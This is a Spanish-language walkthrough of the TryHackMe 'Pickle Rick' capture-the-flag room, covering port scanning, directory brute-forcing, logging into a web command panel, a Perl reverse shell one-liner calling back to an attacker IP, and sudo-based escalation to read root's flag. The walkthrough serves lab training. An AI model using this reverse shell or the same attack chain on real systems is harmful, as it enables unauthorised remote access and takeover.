---
description: '✍️ Autor: tryhackme, ar33zy, arebel 🔍 Dificultad: Fácil'
---

# Pickle Rick

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.146.162
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap 10.10.146.1626
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo el puerto **22** perteneciente al servicio **SSH** y el puerto **80** perteneciente al servicio **HTTP** están abiertos, por lo que se procederá a indagar más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 10.10.146.162
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-19 220800.png" alt=""><figcaption></figcaption></figure>

Revisando el código fuente hay algo relevante como un usuario.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-19 220926.png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:&#x20;

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml,js -u http://10.10.146.162
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Encontramos una página de login y un robots.txt interesantes.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con el usuario y contraseña descubierta anteriormente.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-19 222026.png" alt=""><figcaption></figcaption></figure>

Es un panel de comandos por lo que listamos y vemos el contenido.

<div><figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure> <figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-19 222225.png" alt=""><figcaption></figcaption></figure> <figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-19 222253.png" alt=""><figcaption></figcaption></figure></div>

### 🚀 **EXPLOTACIÓN**

Como podemos ejecutar comandos para obtener una Reverse Shell.

<pre><code><strong>nc -nlvp 4444
</strong><strong>perl -e 'use Socket;$i="10.8.146.101";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&#x26;S");open(STDOUT,">&#x26;S");open(STDERR,">&#x26;S");exec("sh -i");};'
</strong></code></pre>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-19 222859.png" alt=""><figcaption></figcaption></figure>

Comprobamos que tienen todos los permisos por lo que podemos ejecutar como root cualquier comando.

```
sudo ls /root/
sudo cat /root/3rd.txt
```

